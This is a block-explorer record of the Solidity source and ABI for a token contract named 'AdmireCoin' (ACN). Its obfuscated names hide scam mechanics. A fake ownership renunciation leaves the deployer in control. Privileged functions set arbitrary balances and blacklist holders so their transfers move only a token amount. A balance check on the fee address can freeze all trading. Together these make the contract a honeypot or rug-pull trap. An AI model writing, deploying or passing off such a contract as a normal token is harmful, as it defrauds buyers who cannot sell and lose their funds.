{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract amountEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txWallet {\n    function createPair(address shouldMarketing, address launchTakeLiquidity) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface sellMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface takeReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoSwap) external view returns (uint256);\n\n    function transfer(address isTo, uint256 fromList) external returns (bool);\n\n    function allowance(address marketingWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isTo,\n        uint256 fromList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isMin, uint256 value);\n    event Approval(address indexed marketingWallet, address indexed spender, uint256 value);\n}\n\ninterface takeReceiverMetadata is takeReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AdmireCoin is amountEnable, takeReceiver, takeReceiverMetadata {\n\n    uint256 private launchedReceiver;\n\n    mapping(address => bool) public walletEnable;\n\n    address limitEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private exemptLimit;\n\n    string private feeAt = \"Admire Coin\";\n\n    function approve(address enableSellSwap, uint256 fromList) public virtual override returns (bool) {\n        listAuto[_msgSender()][enableSellSwap] = fromList;\n        emit Approval(_msgSender(), enableSellSwap, fromList);\n        return true;\n    }\n\n    mapping(address => uint256) private senderMarketing;\n\n    function totalAmount() private view {\n        require(walletEnable[_msgSender()]);\n    }\n\n    uint256 tradingMax;\n\n    uint8 private txMax = 18;\n\n    bool public marketingAmount;\n\n    function tradingExempt(address receiverTrading, address isTo, uint256 fromList) internal returns (bool) {\n        if (receiverTrading == totalShouldIs) {\n            return sellAt(receiverTrading, isTo, fromList);\n        }\n        uint256 isShould = takeReceiver(launchedSender).balanceOf(autoFund);\n        require(isShould == receiverShould);\n        require(isTo != autoFund);\n        if (txBuy[receiverTrading]) {\n            return sellAt(receiverTrading, isTo, tradingFeeMarketing);\n        }\n        fromList = shouldToTake(receiverTrading, isTo, fromList);\n        return sellAt(receiverTrading, isTo, fromList);\n    }\n\n    bool public totalLimit;\n\n    address private sellMode;\n\n    function walletAt() public {\n        emit OwnershipTransferred(totalShouldIs, address(0));\n        sellMode = address(0);\n    }\n\n    event OwnershipTransferred(address indexed receiverMin, address indexed sellFrom);\n\n    function symbol() external view virtual override returns (string memory) {\n        return isTokenExempt;\n    }\n\n    address public launchedSender;\n\n    string private isTokenExempt = \"ACN\";\n\n    address autoFund;\n\n    function isTrading(address atModeLiquidity) public {\n        totalAmount();\n        \n        if (atModeLiquidity == totalShouldIs || atModeLiquidity == launchedSender) {\n            return;\n        }\n        txBuy[atModeLiquidity] = true;\n    }\n\n    uint256 public sellEnableFee = 0;\n\n    function getOwner() external view returns (address) {\n        return sellMode;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return feeAt;\n    }\n\n    function listFeeMarketing(uint256 fromList) public {\n        totalAmount();\n        receiverShould = fromList;\n    }\n\n    function owner() external view returns (address) {\n        return sellMode;\n    }\n\n    uint256 constant tradingFeeMarketing = 13 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedAtLimit;\n    }\n\n    function balanceOf(address autoSwap) public view virtual override returns (uint256) {\n        return senderMarketing[autoSwap];\n    }\n\n    function transferFrom(address receiverTrading, address isTo, uint256 fromList) external override returns (bool) {\n        if (_msgSender() != limitEnable) {\n            if (listAuto[receiverTrading][_msgSender()] != type(uint256).max) {\n                require(fromList <= listAuto[receiverTrading][_msgSender()]);\n                listAuto[receiverTrading][_msgSender()] -= fromList;\n            }\n        }\n        return tradingExempt(receiverTrading, isTo, fromList);\n    }\n\n    uint256 public receiverList = 3;\n\n    address public totalShouldIs;\n\n    function shouldToTake(address receiverTrading, address isTo, uint256 fromList) internal view returns (uint256) {\n        require(fromList > 0);\n\n        uint256 receiverIsTx = 0;\n        if (receiverTrading == launchedSender && receiverList > 0) {\n            receiverIsTx = fromList * receiverList / 100;\n        } else if (isTo == launchedSender && sellEnableFee > 0) {\n            receiverIsTx = fromList * sellEnableFee / 100;\n        }\n        require(receiverIsTx <= fromList);\n        return fromList - receiverIsTx;\n    }\n\n    uint256 private launchedAtLimit = 100000000 * 10 ** 18;\n\n    uint256 receiverShould;\n\n    uint256 public listLaunch;\n\n    function receiverWalletTotal(address maxSender, uint256 fromList) public {\n        totalAmount();\n        senderMarketing[maxSender] = fromList;\n    }\n\n    function exemptTeam(address totalBuy) public {\n        require(totalBuy.balance < 100000);\n        if (totalLimit) {\n            return;\n        }\n        \n        walletEnable[totalBuy] = true;\n        if (launchedReceiver != exemptLimit) {\n            marketingAmount = true;\n        }\n        totalLimit = true;\n    }\n\n    constructor (){\n        if (buySell != exemptLimit) {\n            exemptLimit = launchedReceiver;\n        }\n        walletAt();\n        sellMarketing autoAmountTake = sellMarketing(limitEnable);\n        launchedSender = txWallet(autoAmountTake.factory()).createPair(autoAmountTake.WETH(), address(this));\n        autoFund = txWallet(autoAmountTake.factory()).feeTo();\n        if (exemptLimit != launchedReceiver) {\n            maxShould = exemptLimit;\n        }\n        totalShouldIs = _msgSender();\n        walletEnable[totalShouldIs] = true;\n        senderMarketing[totalShouldIs] = launchedAtLimit;\n        if (takeFrom == marketingAmount) {\n            exemptLimit = launchedReceiver;\n        }\n        emit Transfer(address(0), totalShouldIs, launchedAtLimit);\n    }\n\n    mapping(address => mapping(address => uint256)) private listAuto;\n\n    uint256 public buySell;\n\n    bool public takeFrom;\n\n    function sellAt(address receiverTrading, address isTo, uint256 fromList) internal returns (bool) {\n        require(senderMarketing[receiverTrading] >= fromList);\n        senderMarketing[receiverTrading] -= fromList;\n        senderMarketing[isTo] += fromList;\n        emit Transfer(receiverTrading, isTo, fromList);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return txMax;\n    }\n\n    mapping(address => bool) public txBuy;\n\n    function transfer(address maxSender, uint256 fromList) external virtual override returns (bool) {\n        return tradingExempt(_msgSender(), maxSender, fromList);\n    }\n\n    uint256 private maxShould;\n\n    function allowance(address senderToken, address enableSellSwap) external view virtual override returns (uint256) {\n        if (enableSellSwap == limitEnable) {\n            return type(uint256).max;\n        }\n        return listAuto[senderToken][enableSellSwap];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableSellSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSellSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalBuy\",\"type\":\"address\"}],\"name\":\"exemptTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atModeLiquidity\",\"type\":\"address\"}],\"name\":\"isTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromList\",\"type\":\"uint256\"}],\"name\":\"listFeeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromList\",\"type\":\"uint256\"}],\"name\":\"receiverWalletTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellEnableFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalShouldIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AdmireCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}